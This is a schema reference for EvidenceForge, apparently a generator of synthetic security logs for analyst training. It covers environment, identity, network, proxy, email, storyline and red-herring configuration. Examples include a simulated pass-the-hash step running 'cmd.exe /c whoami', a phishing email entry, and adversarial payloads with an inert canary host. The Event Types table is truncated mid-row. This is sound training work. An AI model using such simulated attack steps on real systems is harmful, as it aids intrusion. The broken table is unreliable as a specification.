# Scenario Schema Reference

This document describes the EvidenceForge scenario file schema, including Phase 2.4 enhanced fields.

## Overview

Scenario files are YAML documents that define the environment, users, systems, personas, and storyline for log generation. All fields marked "Phase 2.4+" are optional and backward compatible with Phase 1 scenarios.

## Top-Level Structure

```yaml
version: "1.0"
name: scenario-name          # Alphanumeric, dash, underscore
description: |
  Multi-line scenario description
environment: ...
personas: [...]               # Optional
time_window: ...
baseline_activity: ...
logon_grace_period: "30m"    # Optional (default: "30m") — suppresses "no prior logon" warnings within this duration of time_window.start
observation_profile: complete # Optional (default: complete) — named source-observation profile
storyline: [...]              # Optional
red_herrings: [...]          # Optional: suspicious-but-benign events for analyst training
output: ...
```

## Includes

Large scenarios can be split across multiple YAML files with a top-level
`includes` key. Include paths are resolved relative to the YAML file that
declares them, not relative to the current shell directory.

```yaml
includes:
  - common/environment.yaml
  - common/personas.yaml

version: "1.0"
name: credential-access-lab
description: Scenario-specific attack narrative
time_window: ...
baseline_activity: ...
storyline: ...
output: ...
```

Included files contain ordinary scenario YAML fragments, usually with the same
top-level section wrapper they would have in `scenario.yaml`:

```yaml
# common/environment.yaml
environment:
  description: Shared branch-office environment
  users: [...]
  systems: [...]
```

Includes are expanded before schema validation. Mappings are merged recursively
only when fields are disjoint, so this is composition rather than override
inheritance. If `scenario.yaml` and an included file both define
`environment.users`, or two included files both define `time_window.duration`,
EvidenceForge reports a validation-time input error that names the conflicting
field and source files. Lists such as `storyline`, `users`, and `systems` are
owned as whole fields and are not automatically concatenated.

Nested includes are allowed and are resolved relative to the file that declares
them:

```yaml
# common/environment.yaml
includes:
  - network.yaml

environment:
  users: [...]
  systems: [...]
```

The singular `include` key is accepted as a convenience for one file, but
`includes` is the preferred form for new scenarios.

For larger exercise families, keep reusable organization context separate from
scenario-specific narrative files:

```text
scenarios/
  organizations/<org>/
    ENVIRONMENT.md
    includes/
      environment.yaml
      personas.yaml
      baseline.yaml
      observation.yaml

  <scenario>/
    scenario.yaml
    includes/
      storyline.yaml
      red_herrings.yaml
      # optional local override copies of org include files
```

In this layout, `scenario.yaml` can include files from the organization directory
using paths relative to the scenario file, such as
`../organizations/<org>/includes/environment.yaml`. If a scenario needs to
change a shared organization section, copy that organization include into the
scenario's local `includes/` directory and include the local copy instead of the
shared one. Do not include both copies of the same section, because duplicate
fields are validation errors rather than overrides.

## Environment

```yaml
environment:
  description: "Corporate office network"
  timezone:
    default: "America/New_York"
    systems:                  # Optional pattern-based overrides
      "EU-*": "Europe/London"
      "AP-*": "Asia/Tokyo"
  users: [...]
  systems: [...]
  service_accounts: [...]      # Optional: extra account names valid as storyline actors
  stale_accounts:              # Optional: inactive accounts that generate background noise
    - username: former.employee
      last_active: "2023-11-15"
      reason: "Transferred to another office"
    - username: svc_old_crm
      last_active: "2024-01-02"
      reason: "CRM system decommissioned"
  groups: [...]               # Optional
  identity: ...               # Optional: logical-user to platform-account overrides
```

Stale accounts generate multiple types of background evidence: failed network logons (~15%/hour), Kerberos pre-auth failures (4771, status 0x12) on DCs (~5%/hour), scheduled task failures (batch logon type 4, ~3%/hour), and service startup failures (type 5, first hour only). Remote Windows failed-auth attempts use data-driven auth realism profiles for 4625 field shape, DC-side 4771/4776 validation-path selection, and matching established/reset-after-payload network evidence when sensors can see the traffic. Each field:
- `username`: Account name (must not collide with active users or service_accounts)
- `last_active`: ISO date when the account was last active (context only, not used by engine)
- `reason`: Why the account is stale (context only, for ground truth documentation)

### Timezone Configuration

All internal timestamps are stored in UTC. The timezone configuration controls output formatting.

- **default**: Applied to all systems unless overridden (default: `"UTC"`)
- **systems**: Pattern-based overrides using fnmatch glob syntax (`*`, `?`, `[seq]`)
  - First matching pattern wins
  - Unmatched hostnames use the default

Valid timezone names are any [pytz timezone](https://en.wikipedia.org/wiki/List_of_tz_database_time_zones) (e.g., `America/New_York`, `Europe/London`, `Asia/Tokyo`, `UTC`).

### Identity Directory

Scenario `users` are logical people. During generation, EvidenceForge builds an
internal identity directory that maps each logical user to optional Windows and
Linux platform accounts. Existing scenarios do not need any identity block:

- If `environment.domain` or a domain controller exists, scenario users get
  Windows domain accounts by default.
- If no Windows domain exists, Windows accounts default to host-local accounts on
  the user's assigned or primary Windows workstation.
- Linux accounts default to directory-backed identities with stable UIDs across
  Linux hosts.
- Windows SIDs/RIDs and Linux UIDs/GIDs are never shared identifiers. A user may
  have both platforms at the same time; the logical username is the join point.
- Built-in, machine, daemon, and service accounts remain platform-specific.

Optional overrides are available when a scenario needs exact account naming or
platform scoping:

```yaml
environment:
  identity:
    windows_default_scope: auto      # auto | domain | local
    linux_default_scope: directory   # directory | local
    users:
      aisha.johnson:
        windows:
          scope: domain              # auto | domain | local | disabled
          account_name: aisha.johnson
        linux:
          scope: directory           # auto | directory | local | disabled
          account_name: aisha.johnson
          uid: 2528                  # Optional, unique in Linux identity namespace
          gid: 2528                  # Optional
```

All fields are optional. Explicit Windows SID overrides and Linux UID overrides
must be unique within their platform namespace. Account existence and activity
placement are intentionally separate: a directory-backed Linux account can exist
across Linux hosts, while local interactive activity is still placed by the world
model using assigned users, primary systems, host roles, and plausible admin
behavior.

### Users

```yaml
users:
  - username: jsmith           # Required: alphanumeric, dash, underscore
    full_name: "Jane Smith"    # Required
    email: jane@example.com    # Required
    groups: ["developers"]     # Optional
    enabled: true              # Optional (default: true)
    persona: developer         # Optional: reference to persona name
    primary_system: WS-01      # Required: reference to system hostname
```

`primary_system` is operationally important, not just descriptive. The compiled world model uses it to place the user's interactive activity, choose realistic remote-admin source hosts, and decide when server activity should be modeled as SSH/RDP/network access instead of a local console session.

### Systems

```yaml
systems:
  - hostname: WS-01            # Required: RFC 1123 compliant
    ip: "10.0.1.10"            # Required: IPv4 or IPv6
    os: "Windows 10"           # Required
    type: workstation          # Required: workstation|server|domain_controller
    assigned_user: jsmith      # Optional: reference to username
    services: ["IIS"]          # Optional
    roles: [web_server]        # Optional: forward_proxy, web_server, dns_server, mail_server
```

`roles` and `services` materially affect realism. They feed the compiled world model that drives infrastructure discovery, proxy routing, legitimate lateral-movement patterns, and whether remote access should look like SSH, RDP, or generic network activity.

### Network Identities

Use `environment.network_identities` for portable scenario-specific domains and
IP ownership. These identities are an in-memory scenario overlay used before the
package DNS registry; they do not edit `.eforge/config/activity/dns_registry.yaml`.

```yaml
environment:
  network_identities:
    - id: partner_portal
      hosts: [partner.example.com]
      ips: ["203.0.113.60"]
      tags: [web, partner]
      dns: true
```

Identity references are authoritative for scenario-authored traffic. Domain fields
resolve through `network_identities`, then package DNS, then a deterministic
synthetic fallback with a validation warning. IP-only activity remains IP-only
unless the event also supplies a hostname or identity. Conflicting identity
definitions are validation errors; event-level host/IP mismatches against a
declared identity are warnings.

### Proxy Deployment

```yaml
proxy:
  mode: transparent              # Optional: transparent|explicit (default: transparent)
  listener_port: 8080            # Optional: explicit-mode proxy listener (default: 8080)
  auth_policy:
    mode: realistic              # realistic|legacy (default: realistic)
    non_human_principals: false  # Opt-in only; default keeps machine/service auth off
```

`environment.proxy` controls how systems with `roles: [forward_proxy]` appear in network evidence:

- `transparent` preserves direct-looking client-to-origin Zeek/IDS traffic while still generating proxy access logs.
- `explicit` models PAC/browser-configured proxy behavior by replacing the logical client-to-origin connection with two concrete legs: client-to-proxy on `listener_port`, then proxy-to-origin on the destination port. Sensor placement determines which leg each Zeek/IDS/firewall source sees. Denied proxy requests stop at the proxy and do not emit a proxy-to-origin leg.

If `proxy_access` is requested and `environment.proxy` is omitted, validation warns and defaults to `transparent`. If `mode: explicit` is set without `listener_port`, validation warns and defaults to `8080`.

`auth_policy.mode: realistic` renders ordinary browser/SaaS proxy rows with the
assigned human user, while allowlisted infrastructure classes such as software
updates, telemetry, CRL, and OCSP can render unauthenticated (`-`) proxy rows.
Machine/service-account proxy usernames are not emitted routinely; set
`non_human_principals: true` with low `machine_account_probability` or
`service_account_probability` only for environments that intentionally
authenticate non-human proxy clients. `mode: legacy` preserves the older
machine-context User-Agent behavior for compatibility datasets.

### Email Topology

Use `environment.email` when the scenario needs modeled on-prem SMTP delivery,
Zeek `smtp.log`, or generated email artifacts. The email topology is explicit:
`roles: [mail_server]` alone does not enable email-message generation.

```yaml
email:
  accepted_domains: [corp.example]
  mail_servers:
    - name: eng
      hostname: mail-eng.corp.example
      system: MAIL-ENG
      platform: generic_smtp          # generic_smtp | exchange
      allow_inbound_starttls: false
      attempt_outbound_starttls: true
  default_mailbox_servers: [eng]
  mailbox_overrides:
    - group: finance
      server: fin
  outbound_routes:
    - name: default
      servers: [eng]
  inbound_route: [eng]
  isp_relays: []                      # Optional global ISP relay hostnames
  distribution_groups:
    - address: finance@corp.example
      members: [bob@corp.example]
  artifacts:
    mode: storyline                   # none | storyline | selected | all
    selected_ids: []
  background_messages_per_user_per_day: 0.0
  corpus: email_corpus.yaml           # Optional scenario-relative content corpus
```

V1 supports on-prem/local email only. User mail clients submit plaintext SMTP on
587 to the user's mailbox server; SMTP servers relay on port 25. Server-to-server
STARTTLS is negotiated when the sending server has `attempt_outbound_starttls:
true` and the receiving server has `allow_inbound_starttls: true`. If STARTTLS
protects message transfer, Zeek SMTP rows omit protected header/body/file fields.
Mailbox reads are modeled separately with `email_read`; V1 emits only opaque
TLS access sessions using IMAPS on 993 or OWA-style HTTPS on 443.

Internal mail routes from the sender's mailbox server to each recipient's mailbox
server, collapsing same-server hops. Outbound internet mail uses the default
route plus optional sender group overrides; by default org mail servers deliver
directly to destination MX hosts, or through `isp_relays` when configured.
Inbound internet mail uses `inbound_route` for all accepted domains. Distribution
groups are one-level only; nested groups are validation errors.

Email artifact metadata is written to top-level `ARTIFACTS_MANIFEST.json` under
`email.messages`; selected materialized messages are written as `.eml` files
under `artifacts/email/`. Manifest rows include blind-safe export status fields
so metadata-only messages are explicit. Storyline email artifacts are also
referenced from `GROUND_TRUTH.json` and `GROUND_TRUTH.md`. Generation is deterministic: any
AI-authored message bodies or corpora must be prepared during scenario creation,
not during `eforge generate`.

Optional `email_corpus.yaml` files contain deterministic content entries:

```yaml
messages:
  - id: phishing-note
    subject: Quarterly forecast review
    body: |
      Please review the attached notes.
    user_agent: Microsoft Outlook 16.0
    headers:
      X-Campaign-ID: q1-finance
    attachments:
      - filename: forecast.txt
        content_type: text/plain
        content: Synthetic attachment text
    background: false
    storyline: true
```

`email_message.corpus_id` uses the corpus entry for content while the storyline
event remains authoritative for routing fields such as sender, To, Cc, and Bcc.
For V1, do not combine `corpus_id` with inline `body` or `attachments`.

### System Roles

The `roles` field declares a system's function in the network. The engine uses roles to generate both **outbound** traffic (connections the host initiates) and **inbound** traffic (connections the host receives):

- `web_server` — outbound: database queries, LDAP auth, API calls; inbound: HTTPS/HTTP from external clients and internal users. Human inbound traffic is generated as browsing sessions: top-level page views consume the `web` traffic-rate budget, and required assets/API calls fan out from each page load with shared HTTP transaction-depth and file-analysis semantics where applicable.
- `database` — outbound: replication, updates; inbound: SQL queries from web/app servers
- `mail_server` — outbound: SMTP relay, LDAP lookups; inbound: SMTP from internet, webmail from users
- `file_server` — outbound: Kerberos/LDAP auth; inbound: SMB file access from workstations. File-server roles also increase baseline SMB target selection beyond normal DC SYSVOL/GPO traffic.
- `domain_controller` — outbound: inter-DC replication; inbound: Kerberos/LDAP/DNS from all hosts
- `forward_proxy` — routes outbound HTTP/HTTPS traffic through this system; generates proxy access logs with CONNECT entries for HTTPS and full destination URLs
- `dns_server` — DNS resolution target

Inbound traffic is constrained by network topology: DMZ hosts receive substantial external traffic, while internal servers only receive connections from other internal systems. The firewall policy determines what gets permitted vs denied — denied connection attempts still produce firewall deny records and source-side sensor visibility.

For server and infrastructure hosts, pair `roles` with realistic `services` whenever possible. `roles` tell the engine what the host is for; `services` help the world model infer concrete protocols and destinations (for example, PostgreSQL vs MSSQL, web stack vs proxy stack, SSH-capable Linux admin targets, and so on).

For `web_server` hosts, explicit scheme service markers are authoritative for
`http_*` spillage compatibility: `services: [http]` is HTTP-only, `https`,
`ssl`, or `tls` means HTTPS-capable, and `http` plus any HTTPS marker means both.
If no explicit scheme marker exists, generic legacy web markings such as
`roles: [web_server]`, empty `services`, `nginx`, `apache2`, `httpd`, or `iis`
support both HTTP and HTTPS.

### Network Segment Exposure

Segments can declare their internet exposure via the `exposure` field:

```yaml
network:
  segments:
    - name: workstations
      cidr: "10.0.1.0/24"
      exposure: internal        # Only internal clients (default)
    - name: dmz
      cidr: "10.0.2.0/24"
      exposure: both            # Internal + external clients
```

Values: `internal` (default), `external`, `both`. Affects web server client IP generation — `both` and `external` segments produce a mix of internal and external client IPs in web access logs.

### Network Sensors And Firewalls

`environment.network.sensors` is optional. Declare segments and `public_cidrs`
without sensors when topology context is useful but the lab only emits host,
web, or `proxy_access` logs. With no sensors, EvidenceForge still models the
activity, but Zeek, IDS, firewall, and Cisco ASA sensor-backed logs are not
generated. Validation warns when a network topology has no sensors.

Proxy-only labs do not need placeholder Zeek sensors:

```yaml
network:
  segments:
    - {name: services, cidr: "10.0.0.0/24", exposure: internal, systems: [proxy01]}
    - {name: corporate_lan, cidr: "10.0.1.0/24", exposure: internal, systems: [ws01]}
  # sensors may be omitted when output.logs only requests host/proxy formats
```

Add sensors when output logs need packet/flow, IDS, or firewall evidence. Each
sensor type produces different log formats:

```yaml
network:
  sensors:
    - type: network             # network | ids | firewall
      name: core-tap
      hostname: zeek01          # Output directory name (falls back to name)
      monitoring_segments: [corporate_lan, server_vlan]
      direction: bidirectional  # bidirectional | inbound | outbound
      placement: span           # span mirrors segment traffic | tap observes uplink/boundary traffic
      log_formats: [zeek]       # Format groups or individual formats
```

`span` sensors can see traffic where either endpoint belongs to a monitored segment, including same-segment traffic. `tap` sensors do not see same-segment traffic. When a TAP monitors multiple internal segments, internal cross-segment traffic is visible only if both endpoint segments are monitored; external/boundary traffic remains visible when either side is monitored.

#### Firewall Sensors

Firewall entries use `type: firewall` under `network.sensors` for compatibility.
They model an active firewall control point, not only a passive sensor: policy,
NAT, deny baseline, threat detection, and Cisco ASA logging all live here.
Validation warns when a network topology has no firewall entry. Requesting `cisco_asa` without a firewall entry whose `log_formats` include `cisco_asa` is an error.

```yaml
    - type: firewall
      name: fw01
      hostname: fw01
      monitoring_segments: [workstations, servers, dmz]
      placement: tap
      direction: bidirectional
      log_formats: [cisco_asa]
      interfaces:               # Map segment names to ASA interface names
        workstations: inside
        servers: inside
        dmz: dmz
      default_action: deny      # deny (default) | permit
      deny_ratio: 5.0           # Deny events per allow event in baseline (default: 5.0)
      threat_detection_rate: 10 # Deny rate (drops/sec) triggering 733100 alerts (0=disabled)
      nat_rules:
        - type: dynamic_pat
          src: [workstations, servers]
          mapped_ip: 45.83.220.1
        - type: static
          real_ip: 172.16.0.5
          mapped_ip: 45.83.220.5
      policy:                   # Ordered rules — first match wins
        - {src: external, dst: dmz, ports: [80, 443]}
        - {src: workstations, dst: any}
        - {src: servers, dst: external, ports: [80, 443, 53]}
        - {src: servers, dst: servers}
```

**Policy rules** (`FirewallRule`):
- `src` / `dst`: segment name, `"external"` (IPs not in any segment), specific IP, CIDR notation, or `"any"`
- `ports`: list of port numbers, or empty list / `"any"` for all ports
- `action`: `"permit"` (default) or `"deny"`

#### Public Address Space

The `public_cidrs` field on `NetworkConfig` declares the org's public IP address blocks. External scan/probe traffic targets these ranges instead of internal IPs, and legitimate inbound connections use VIPs (static NAT `mapped_ip` values) as the wire-level destination.

```yaml
network:
  public_cidrs: ["45.83.220.0/28"]  # Optional — auto-derived from VIPs if omitted
  segments: [...]
  sensors: [...]                     # Optional unless sensor-backed logs are requested
```

**Auto-derivation:** When `public_cidrs` is empty, VIPs from static NAT rules are grouped by /24 prefix to create scan target ranges. For example, VIPs `45.83.220.10` and `45.83.220.14` produce `["45.83.220.0/24"]`.

**Inbound traffic flow:** External clients connect to VIPs (public IPs). The NAT engine translates to real (internal) IPs per sensor — outside Zeek sees VIPs, inside Zeek sees real IPs, ASA shows both in Built/Teardown records.
- Rules are evaluated in order; first match wins (like real ACLs)
- Traffic not matching any rule is subject to `default_action`

**Interfaces**: Map segment names to ASA interface names (e.g., `inside`, `outside`, `dmz`). IPs not in any mapped segment resolve to `"outside"`.

**Threat detection**: The ASA emitter automatically tracks per-source-IP deny rates and fires 733100 alerts when both burst (default 10 drops/sec over 20s) and average (default 5 drops/sec over 60s) thresholds are exceeded. Set `threat_detection_rate: 0` to disable.

**NAT rules**: Define Network Address Translation behavior for the firewall. Each rule in the `nat_rules` list supports:
- `type`: `dynamic_pat` (many:1 with port translation) or `static` (1:1 IP mapping)
- `src`: segment name(s), IP, or CIDR. Accepts a string or list.
- `mapped_ip`: the post-NAT IP address
- `real_ip`: for static NAT, the specific internal IP being mapped

Dynamic PAT: all traffic from matching segments shares one external IP with port translation. Static NAT: bidirectional 1:1 mapping, enables inbound connections to DMZ servers via public IP. NAT only applies to permitted connections that cross segment boundaries; denied connections are not NATted.

### Database Service Routing

When a system has the `database` role, the engine determines the DB protocol from `services`:

- `services: [postgresql]` → PostgreSQL on port 5432
- `services: [mysql]` or `services: [mariadb]` → MySQL on port 3306
- `services: [mssql]` or `services: [sqlserver]` → MSSQL on port 1433

When `services` is empty, the engine infers from OS: **Linux → PostgreSQL**, **Windows → MSSQL**. Traffic generation only routes database connections to hosts running the matching DB engine — a PostgreSQL host never receives MSSQL traffic, even in mixed-DB environments.

### External Inbound Requirements

External inbound traffic requires the target host to be reachable from the internet:

- **Hosts with static NAT VIP** → External clients connect to the VIP; NAT translates per sensor
- **Hosts with a public IP** (non-RFC1918, e.g., cloud) → External clients connect directly
- **RFC1918 hosts without a VIP** → External inbound is silently skipped (unreachable)

If a system needs external inbound traffic, either configure a static NAT rule with `mapped_ip` or assign it a public IP address.

### Session Management

The engine manages user sessions with exact transport-type matching. When a storyline or baseline requests a session on a host, the engine:

1. Checks for an existing session with the **exact** `session_kind` (interactive, network, ssh, rdp)
2. If no match, creates a new session with the appropriate transport evidence (SSH syslog, RDP 4624 type 10, etc.)

Multi-phase remote activities use action-bundle semantics internally. For example,
an SSH request is modeled as one SSH session action that coordinates transport,
auth, session, process, bash-history, endpoint/EDR, and teardown evidence before
the engine dispatches individual canonical `SecurityEvent`s. An RDP request is
modeled as one remote interactive session action that coordinates source-side
`mstsc.exe`, TCP/3389 transport, target Type 10 logon/session metadata, and
source-visible ordering before dispatch. Windows remote-admin events such as
`explicit_credentials` and `service_installed` likewise use bundle-owned evidence
paths for caller-process timing, source endpoint semantics, service-control
transport, dropped service binaries, and target service records.
Canonical `connection` and `beacon` evidence routes through the network-connection
bundle so tuple identity, source ports, DNS/TLS/HTTP/file metadata, proxy and
firewall visibility, IDS/EDR FLOW correlation, and Windows WFP companions stay
consistent across output formats.

Built-in accounts (SYSTEM, LOCAL SERVICE, NETWORK SERVICE) and service accounts always use local system sessions — they never fabricate remote logon evidence.

Sessions marked as `storyline_protected` (by storyline events that depend on them) are immune to baseline logoff, even if logoff was already planned for the same hour.

### Baseline Failed Logon Noise

The engine automatically generates realistic failed logon patterns without scenario configuration:

- **Password typos** (~5% of interactive logons): 1-2 failed attempts (4625) immediately before a successful logon (4624) for the same user. Simulates mistyped complex passwords.
- **Remote failed auth**: network 4625 events use data-driven Windows auth realism profiles for LogonProcessName/auth package, DC-side 4771/4776 validation-path selection, and matching sensor-visible connection evidence. Auth-bearing connections are established or reset after payload; SYN-only probes are reserved for scans/unreachable services without host auth evidence.
- **Stale scheduled tasks**: Periodic failed batch logons (type 4) from plausible service accounts on deterministic hosts. Fires every 1-2 hours, representing forgotten tasks with expired credentials.
- **Management software sweeps**: 1-2 times per business day, a management tool tries a disabled credential across 5-15 servers in quick succession. All fail with "account disabled."

These patterns augment the explicit `stale_accounts` feature, which generates additional failures from accounts you define. Together they produce a realistic ratio of failed-to-successful authentication events.

## Personas

Personas define user behavior patterns for activity generation. EvidenceForge includes 15 pre-built personas (developer, analyst, sysadmin, executive, etc.) that are resolved automatically by name — reference them in user definitions without needing to define them inline. Define personas inline only if you need to customize behavior beyond what the pre-built library provides; inline definitions override pre-built ones with the same name.

```yaml
personas:
  - name: developer            # Required: unique identifier
    description: "Software developer who codes and browses"  # Required
    typical_activities:        # Optional list of activity strings
      - coding
      - web_browsing
    work_hours: "9am-5pm"     # Optional (default: "9am-5pm")
    application_usage:         # Optional
      - vscode
      - chrome
    risk_profile: low          # Optional: low|medium|high (default: "medium")
```

### Work Hours Format

The `work_hours` field supports these formats:
- `"9am-5pm"` - Basic range
- `"8:30am-5:30pm"` - Half-hour precision
- `"9am-5pm (lunch 12pm-1pm)"` - With lunch break
- `"8:30am-5:30pm (lunch 12:30pm-1:30pm)"` - Both combined

Work hours are automatically parsed into a `work_hours_parsed` dict containing:
- `start`: Start hour as float (e.g., 9.0, 8.5)
- `end`: End hour as float (e.g., 17.0, 17.5)
- `lunch`: Tuple of (start, end) if specified, else null
- `hours`: List of active integer hours (excluding lunch)
- `peak_hours`: Mid-morning and mid-afternoon hours

### Browsing Intensity

The `browsing_intensity` field controls how much HTTP traffic a persona generates per browsing session. It affects proxy log depth (number of page loads and subresource cascades) for baseline web activity. Inbound `web_server` background traffic uses the separate `web_session_profiles.yaml` visitor mix: `traffic_rates.web` counts top-level visitor actions, then page assets and same-origin API calls fan out automatically. Plaintext HTTP browser sessions can produce multiple Zeek `http.log` rows on one connection UID with increasing `trans_depth`; every transmitted nonempty response entity attaches matching responder-direction `files.log` metadata.

```yaml
personas:
  - name: developer
    browsing_intensity: normal    # Optional: light | normal | heavy (default: "normal")
```

| Value | Behavior |
|-------|----------|
| `light` | 1 page load, few subresources (CSS, 1-2 images) |
| `normal` | 1-2 page loads, typical subresource cascade |
| `heavy` | 2-4 page loads, full subresource cascades (JS, CSS, images, fonts, API calls) |

Available on persona definitions and as a per-user override on user entries. Per-user override takes precedence over the persona default:

```yaml
users:
  - username: marcus.chen
    persona: developer
    browsing_intensity: heavy    # Overrides developer persona's default
    primary_system: WS-DEV-01
```

### Phase 2.4+ Optional Fields

These fields are for future LLM expansion (Phase 3.1) and are not required:

```yaml
personas:
  - name: developer
    # ... Phase 1 fields above ...

    expanded_activities:       # Phase 2.4+: LLM-populated activity sequences
      - activity_type: process_code
        sequence:
          - action: open_ide
            app: VS Code
          - action: edit_files
            duration_minutes: 30
        temporal_pattern: morning_focus
        frequency: daily

    activity_intensity:        # Phase 2.4+: Per-activity events/hour overrides
      process_code: 20
      connection_web: 5
```

**expanded_activities** items must have:
- `activity_type` (required): Maps to baseline activity types
- `sequence` (optional): List of action steps
- `temporal_pattern` (optional): When this activity typically occurs
- `frequency` (optional): How often (hourly, daily, weekly)

## Time Window

```yaml
time_window:
  start: "2024-01-15T10:00:00Z"  # Required: ISO 8601 UTC
  end: "2024-01-15T18:00:00Z"    # Either end OR duration required
  duration: "8h"                   # Supports: "10h", "3d", "2h30m", "5m30s", "500ms"
  warmup: "8h"                     # Optional (default "8h"). Minimum 1 hour.
```

The `warmup` field controls a pre-generation phase that runs *before* `start` to pre-populate
internal state (DNS cache, process trees, active sessions, Kerberos tickets, Hawkes timing kernels).
Events generated during warm-up update state but are **not** written to output files. This makes
the first minutes of output look like a running system rather than a cold start. Minimum 1 hour;
default 8 hours covers a full day/night transition for maximum realism.

All `storyline` and `red_herrings` times should fall inside the configured `time_window`. For
example, if the final storyline step is scheduled at `+36h`, set `duration` longer than 36 hours
so baseline logs, proxy/firewall evidence, and attack traces cover the same collection horizon.
`eforge validate` warns when a storyline step falls outside the window.

## Baseline Activity

```yaml
baseline_activity:
  description: "Normal office activity"
  intensity: medium              # low|medium|high (events/user/hour)
  variation: low                 # low|medium|high (timing variation)
```

Intensity mapping: low=5, medium=15, high=40 events/user/hour.

### Baseline Traffic Affinities

Use `baseline_activity.traffic_affinities` to shape benign population traffic for
volumetric and timing hunts without adding storyline or red-herring leads.

```yaml
baseline_activity:
  traffic_affinities:
    - name: partner-portal-normal
      kind: web                   # web | connection
      direction: outbound         # outbound | inbound | internal
      destination:
        identity: partner_portal
        port: 443
        service: ssl
      audience:
        groups: [science, programs]
      participation: 0.85
      per_client_sessions: [2, 12]
      cadence: business_hours     # diffuse | business_hours | periodic
      request_profile:
        routes:
          - path: "/portal"
            weight: 30
            methods:
              GET:
                statuses: {"200": 0.94, "302": 0.04, "503": 0.02}
                response_body_bytes: [12000, 90000]
                content_type: text/html
          - path: "/api/projects/{id}/comment"
            weight: 3
            methods:
              POST:
                statuses: {"200": 0.90, "400": 0.06, "401": 0.04}
                request_body_bytes: [100, 3000]
                request_content_type: application/json
                # Optional multipart/content-disposition filename; not a host path.
                request_wire_filename: comment.json
                response_body_bytes: [200, 2000]
                content_type: application/json
```

Web request profiles are route-based: each route owns its valid methods, status
distribution, body-size ranges, response `content_type`, and optional
`request_content_type`/`request_wire_filename` metadata. A wire filename feeds
Zeek's `orig_filenames` but is deliberately not treated as a local host path, so
it does not invent endpoint file-read evidence. Do not model paths, methods, and
status codes as independent random lists; that produces unrealistic combinations
such as POST requests for static resources.

For non-HTTP hunts, use `kind: connection` with `connection_profile` byte,
duration, and `conn_state` ranges. Use `traffic_suppression` to down-rank or
remove matching default baseline traffic for a scoped audience; suppression never
affects explicit storyline or red-herring events.

## Observation Profile

```yaml
observation_profile: complete     # complete | enterprise_standard | messy_collection
```

`observation_profile` selects a named source-observation profile from
`config/activity/observation_profiles.yaml`. The default `complete` profile preserves
training-friendly perfect source coverage and correlation. Non-default profiles may introduce
deterministic source-level missingness and source-native delays while preserving canonical truth:
they can make evidence `visible`, `delayed`, `dropped`, `filtered`, or `out_of_window`, but they
must not create contradictory users, PIDs, ports, hashes, UIDs, or session identifiers across
sources. `GROUND_TRUTH.md` records source evidence status for instructors, and
`OBSERVATION_MANIFEST.json` records the same source-observation contract for automated eval.
Observation decisions are coherent inside source-local lifecycle groups, so a single source does
not drop or delay process create/dependent/terminate rows, logon/logoff rows, or same-UID network
companions independently in a way that would orphan its own evidence.

The same profile name also selects endpoint host-clock defaults from
`config/activity/timing_profiles.yaml`. `complete` keeps endpoint clocks aligned
for training-friendly output. `enterprise_standard` and `messy_collection`
introduce host-level offset/drift plus source-specific observation latency.
Host-resident eCAR uses the same host clock as Windows Security/Sysmon on
Windows hosts and syslog/bash-history on Linux hosts; eCAR does not get a
separate synthetic clock by default. Network, proxy, firewall, and IDS sensors
keep independent appliance clock profiles.

## Storyline

Storyline events define specific actions at specific times. Each entry declares what happened (`activity`, for documentation/GROUND_TRUTH.md) and what events to generate (`events` list with typed, validated fields).

```yaml
storyline:
  - id: evt-lateral-pth        # Required: unique event identifier — must be unique across all storyline events.
                               # Any string format is valid. Prefer descriptive labels (e.g., "evt-lateral-pth",
                               # "evt-c2-beacon-day2") but sequential IDs (e.g., "evt-001") are also fine.
    time: "+2h30m"             # Required: ISO 8601 or relative offset (d/h/m/s/ms)
    actor: john.doe            # Required: username, built-in account (SYSTEM/root), or service_account
    system: WS-01              # Required: system hostname
    activity: "lateral movement via pass-the-hash"  # Required: human-readable description (GROUND_TRUTH.md)
    event_spacing:             # Optional; omitted defaults to human typing cadence
      mode: human              # human|automated|interval|explicit_offsets
    events:                    # Required: typed event declarations
      - type: logon
        source_ip: "10.0.1.20"
        logon_type: 3
      - type: process
        process_name: "C:\\Windows\\System32\\cmd.exe"
        command_line: "cmd.exe /c whoami"
```

### Event Types

Each event in the `events` list has a `type` field that selects a validated schema. Unknown fields are rejected at load time.

`event_spacing` controls the offsets between child events in one storyline or
red-herring step. `human` is the default and preserves the current typing-like
cadence. `automated` accepts `min_delay`/`max_delay` for script/tool bursts.
`interval` accepts `interval` plus optional `jitter` for actions separated by
minutes or hours. `explicit_offsets` accepts one offset per child event, such as
`["0s", "18m", "2h10m"]`.

See [adversarial_payload.md](adversarial_payload.md) | `surface`, and exactly one of `family`/`value` | `scheme` (`http`/`https`, HTTP surfaces only); `syslog_message` and `auth_user` are Linux-only; `dns_qname` needs a network sensor emitting Zeek; `http_*` surfaces need a compatible `web_server`-role host; an optional generation-time live-callback (OOB) mode (`generate`/`validate --oob-host`, opt-in) can replace the inert default canary — by default payloads use the non-resolving canary `canary.eforge.invalid` and are never executed, see [adversarial_payload.md](adversarial_payload.md) |
| `raw` | Any single format | `target_format`, `fields` | |

For `process` events, prefer full process image paths when you know them. Bare executable names are accepted and are normalized through the configured application/process catalog during generation. If a scenario needs a custom install path, add or update the relevant configuration overlay rather than putting an ad hoc path in one storyline event. The generator routes process create/terminate lifecycle and process-owned endpoint side effects through an internal process-execution bundle; scenario authors still describe normal `process` events and do not model the bundle directly.

All event types also accept optional `technique` (MITRE ATT&CK ID) and `description` (human-readable detail) fields for GROUND_TRUTH.md enrichment.

### Red Herrings

Red herrings are suspicious-but-benign events that create false leads for analysts. They use the same event types as the storyline but are documented in a separate "Red Herrings" section of `GROUND_TRUTH.md` with their benign explanations.

```yaml
red_herrings:
  - id: rh-afterhours-admin
    time: "+3h"
    actor: sarah.oconnell        # Must be in users list
    system: DC-01
    activity: "After-hours server maintenance"
    explanation: "Routine sysadmin maintenance performed outside business hours to avoid user impact"
    events:
      - type: logon
        logon_type: 10
        source_ip: "10.10.1.15"
      - type: process
        process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        command_line: "powershell.exe -Command Get-EventLog -LogName System -Newest 50"
```

Each red herring requires:
- `id`: Unique event identifier (must not collide with storyline IDs)
- `time`: Same format as storyline (ISO 8601, relative offset, or seconds)
- `actor`: Username (must be in users list, service_accounts, or a builtin account)
- `system`: Target system hostname
- `activity`: Human-readable description (appears in Red Herrings section of GROUND_TRUTH.md)
- `explanation`: Why this activity is benign (instructor-only context in GROUND_TRUTH.md)
- `events`: Same typed event list as storyline (all event types supported)

